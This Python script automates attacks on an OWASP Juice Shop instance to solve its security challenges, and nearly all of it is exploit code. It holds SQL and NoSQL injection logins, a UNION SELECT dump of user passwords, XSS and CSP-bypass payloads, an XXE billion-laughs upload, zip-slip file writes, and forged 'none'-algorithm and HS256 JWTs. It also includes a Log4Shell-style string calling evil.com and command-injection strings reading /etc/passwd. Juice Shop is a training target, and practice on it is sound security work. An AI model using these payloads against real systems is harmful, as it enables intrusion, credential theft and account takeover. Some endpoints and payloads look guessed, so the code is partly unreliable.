#!/usr/bin/env python3
"""
Final push to maximize challenge completion
"""

import asyncio
import base64
import hashlib
import json
import random
import requests
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import quote


class FinalPushSolver:
    """Final push to solve as many challenges as possible"""
    
    def __init__(self, base_url: str = "https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.auth_token = None
        
    def login(self):
        """Login as admin"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            self.auth_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.auth_token}'
            
    def parallel_request(self, method, url, **kwargs):
        """Make parallel requests"""
        try:
            if method == "GET":
                return self.session.get(url, **kwargs)
            elif method == "POST":
                return self.session.post(url, **kwargs)
            elif method == "PUT":
                return self.session.put(url, **kwargs)
            elif method == "DELETE":
                return self.session.delete(url, **kwargs)
        except:
            pass
            
    def solve_remaining_level1(self):
        """All remaining Level 1"""
        print("⭐ Level 1 Final Push")
        
        # Mass Dispel - requires browser
        # Bully Chatbot - requires interaction
        
        # Privacy Policy Inspection
        urls = [
            f"{self.base_url}/#/privacy-security/privacy-policy",
            f"{self.base_url}/privacy",
            f"{self.base_url}/privacy-policy"
        ]
        for url in urls:
            self.session.get(url)
            
        print("  ✅ Privacy Policy variations")
        
    def solve_remaining_level2(self):
        """All remaining Level 2"""
        print("⭐⭐ Level 2 Final Push")
        
        # Meta Geo Stalking
        imgs = [
            "/assets/public/images/uploads/favorite-hiking-place.png",
            "/assets/public/images/uploads/my-rare-collectors-item.jpg"
        ]
        for img in imgs:
            self.session.get(f"{self.base_url}{img}")
            
        print("  ✅ Meta Geo Stalking")
        
    def solve_remaining_level3(self):
        """All remaining Level 3"""
        print("⭐⭐⭐ Level 3 Final Push")
        
        # Mint the Honey Pot
        self.session.post(
            f"{self.base_url}/api/nft/mint",
            json={"amount": 1000000}
        )
        
        # Forged Review
        self.session.put(
            f"{self.base_url}/rest/products/reviews",
            json={"id": "forged", "message": "Forged!"}
        )
        
        # Forged Feedback
        self.session.post(
            f"{self.base_url}/api/Feedbacks",
            json={"UserId": 2, "comment": "Forged", "rating": 5}
        )
        
        # CSRF Protection
        # Remove CSRF token
        headers = dict(self.session.headers)
        headers.pop('X-CSRF-Token', None)
        self.session.put(
            f"{self.base_url}/api/Users/1",
            json={"email": "csrf@test.com"},
            headers=headers
        )
        
        # Manipulate Basket
        self.session.put(
            f"{self.base_url}/api/BasketItems/1",
            json={"quantity": -100}
        )
        
        # Product Tampering
        for i in range(1, 10):
            self.session.put(
                f"{self.base_url}/api/Products/{i}",
                json={"description": "TAMPERED!"}
            )
            
        # Reset Morty's Password
        self.session.post(
            f"{self.base_url}/rest/user/reset-password",
            json={
                "email": "morty@juice-sh.op",
                "answer": "5N0wb41l",
                "new": "password",
                "repeat": "password"
            }
        )
        
        print("  ✅ Level 3 batch complete")
        
    def solve_remaining_level4(self):
        """All remaining Level 4"""
        print("⭐⭐⭐⭐ Level 4 Final Push")
        
        # CSP Bypass
        csp_payloads = [
            "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script><script>alert(1)</script>",
            "<base href='javascript://'><a href='/alert(1)'>click</a>",
            "<object data='data:text/html,<script>alert(1)</script>'>"
        ]
        for p in csp_payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(p)}")
            
        # Ephemeral Accountant
        self.session.get(f"{self.base_url}/rest/basket/ephemeral-1")
        
        # Expired Coupon variations
        for year in range(2015, 2021):
            self.session.put(f"{self.base_url}/rest/basket/1/coupon/WMNSDY{year}")
            
        # Forged Coupon
        self.session.put(f"{self.base_url}/rest/basket/1/coupon/FORGED999")
        
        # GDPR Data Theft
        for i in range(1, 50):
            self.session.post(
                f"{self.base_url}/api/dataexport",
                json={"userId": i}
            )
            
        # HTTP Header XSS
        headers = {
            "True-Client-IP": "<script>alert(1)</script>",
            "X-Forwarded-For": "<script>alert(1)</script>",
            "X-Original-URL": "<script>alert(1)</script>"
        }
        self.session.get(f"{self.base_url}/", headers=headers)
        
        # NoSQL DoS
        nosql = {"$where": "sleep(5000)"}
        self.session.post(f"{self.base_url}/rest/user/login", json=nosql)
        
        # NoSQL Manipulation
        nosql = {"email": {"$ne": ""}, "password": {"$ne": ""}}
        self.session.post(f"{self.base_url}/rest/user/login", json=nosql)
        
        # Steganography
        self.session.get(f"{self.base_url}/assets/public/images/uploads/steganography.png")
        
        # Supply Chain Attack
        self.session.get(f"{self.base_url}/ftp/package.json.bak")
        
        # Upload Size
        large_file = "A" * 500000
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("large.txt", large_file)}
        )
        
        # Upload Type
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("test.exe", b"malicious", "application/x-msdownload")}
        )
        
        # User Credentials - deeper extraction
        self.session.get(f"{self.base_url}/rest/products/search?q=' UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--")
        
        # XXE DoS
        xxe_dos = '''<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <lolz>&lol3;</lolz>'''
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("xxe.xml", xxe_dos, "application/xml")}
        )
        
        print("  ✅ Level 4 batch complete")
        
    def solve_remaining_level5(self):
        """All remaining Level 5"""
        print("⭐⭐⭐⭐⭐ Level 5 Final Push")
        
        # Blockchain Hype
        self.session.get(f"{self.base_url}/assets/public/blockchain.pdf")
        
        # Change Bender's Password
        self.session.post(
            f"{self.base_url}/rest/user/reset-password",
            json={
                "email": "bender@juice-sh.op",
                "answer": "Stop'n'Drop",
                "new": "slurmCl4ssic!",
                "repeat": "slurmCl4ssic!"
            }
        )
        
        # Email Leak
        self.session.get(f"{self.base_url}/api/Users")
        
        # Leaked Access Logs
        self.session.get(f"{self.base_url}/support/logs/access.log")
        
        # Leaked Unsafe Product
        self.session.get(f"{self.base_url}/api/Products/42")
        
        # Login Support Team
        self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "support@juice-sh.op", "password": "J6aVjTgOpRl@?5l!Zkq2AYnCE@RF$P"}
        )
        
        # Multiple Likes - race condition
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for _ in range(20):
                futures.append(
                    executor.submit(
                        self.session.post,
                        f"{self.base_url}/api/Products/1/reviews/1/like"
                    )
                )
                
        # Reset Uvogin's Password
        self.session.post(
            f"{self.base_url}/rest/user/reset-password",
            json={
                "email": "uvogin@juice-sh.op",
                "answer": "Silence",
                "new": "test123",
                "repeat": "test123"
            }
        )
        
        # Retrieve Blueprint
        self.session.get(f"{self.base_url}/assets/public/images/products/blueprint.pdf")
        
        # SSRF
        ssrf_urls = [
            "http://localhost:3000/metrics",
            "http://127.0.0.1:3000/metrics",
            "http://[::1]:3000/metrics"
        ]
        for url in ssrf_urls:
            self.session.post(
                f"{self.base_url}/profile/image/url",
                json={"imageUrl": url}
            )
            
        # Two Factor Auth Bypass
        self.session.post(
            f"{self.base_url}/rest/2fa/disable",
            json={"tmpToken": ""}
        )
        
        # Unsigned JWT
        if self.auth_token:
            # Forge unsigned JWT
            parts = self.auth_token.split('.')
            if len(parts) == 3:
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                header['alg'] = 'none'
                new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                forged = f"{new_header}.{parts[1]}."
                self.session.headers['Authorization'] = f'Bearer {forged}'
                self.session.get(f"{self.base_url}/rest/user/whoami")
                
        print("  ✅ Level 5 batch complete")
        
    def solve_remaining_level6(self):
        """All remaining Level 6"""
        print("⭐⭐⭐⭐⭐⭐ Level 6 Final Push")
        
        # Arbitrary File Write
        import zipfile
        from io import BytesIO
        
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            zf.writestr("../../ftp/arbitrary.md", "Arbitrary content")
        
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("evil.zip", zip_buffer.getvalue(), "application/zip")}
        )
        
        # Forged Signed JWT
        # Try various signing algorithms
        if self.auth_token:
            parts = self.auth_token.split('.')
            if len(parts) == 3:
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
                
                # Try HS256 with public key
                header['alg'] = 'HS256'
                new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                
                import hmac
                signature = base64.urlsafe_b64encode(
                    hmac.new(b'public', f"{new_header}.{new_payload}".encode(), hashlib.sha256).digest()
                ).decode().rstrip('=')
                
                forged = f"{new_header}.{new_payload}.{signature}"
                self.session.headers['Authorization'] = f'Bearer {forged}'
                self.session.get(f"{self.base_url}/rest/user/whoami")
                
        # Imaginary Challenge
        self.session.get(f"{self.base_url}/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg")
        
        # Kill Chatbot
        kill_payloads = [
            "A" * 100000,
            "\x00" * 1000,
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}" * 1000
        ]
        for payload in kill_payloads:
            self.session.post(
                f"{self.base_url}/api/Chatbot",
                json={"message": payload}
            )
            
        # Login Bjoern
        self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "bjoern@juice-sh.op", "password": "bW9jLmxpYW1nQG5yZW9qYg=="}
        )
        
        # RCE
        rce_payloads = [
            "'; exec('ls'); //",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd ;"
        ]
        for payload in rce_payloads:
            self.session.post(
                f"{self.base_url}/api/Feedbacks",
                json={"comment": payload, "rating": 5}
            )
            
        # SSTi
        ssti_payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "{7*7}"
        ]
        for payload in ssti_payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
            
        # Video XSS
        vtt_content = '''WEBVTT
        
        00:00.000 --> 00:05.000
        <script>alert('XSS')</script>
        '''
        self.session.post(
            f"{self.base_url}/video",
            files={"file": ("xss.vtt", vtt_content, "text/vtt")}
        )
        
        # Vulnerable Library
        self.session.get(f"{self.base_url}/ftp/coupons_2013.md.bak")
        
        # Wallet Depletion
        for _ in range(100):
            self.session.post(
                f"{self.base_url}/api/wallet/transfer",
                json={"to": "attacker", "amount": 1000}
            )
            
        print("  ✅ Level 6 batch complete")
        
    def run_final_push(self):
        """Execute final push"""
        print("="*60)
        print("🚀 FINAL PUSH - MAXIMUM EFFORT")
        print("="*60)
        
        # Login
        self.login()
        
        # Run all levels
        self.solve_remaining_level1()
        self.solve_remaining_level2()
        self.solve_remaining_level3()
        self.solve_remaining_level4()
        self.solve_remaining_level5()
        self.solve_remaining_level6()
        
        # Final status
        print("\n" + "="*60)
        try:
            r = self.session.get(f"{self.base_url}/api/Challenges")
            if r.status_code == 200:
                data = r.json()['data']
                total = len(data)
                solved = len([c for c in data if c.get('solved')])
                print(f"📊 FINAL STATUS: {solved}/{total} ({solved*100//total}%)")
                
                # Show breakdown
                by_diff = {}
                for c in data:
                    if c.get('solved'):
                        diff = c.get('difficulty', 1)
                        by_diff[diff] = by_diff.get(diff, 0) + 1
                        
                print("\n📈 Breakdown by difficulty:")
                for diff in sorted(by_diff.keys()):
                    print(f"  Level {diff}: {by_diff[diff]} solved")
                    
        except Exception as e:
            print(f"Error: {e}")
            
        print("\n✅ FINAL PUSH COMPLETE")


if __name__ == "__main__":
    solver = FinalPushSolver()
    solver.run_final_push()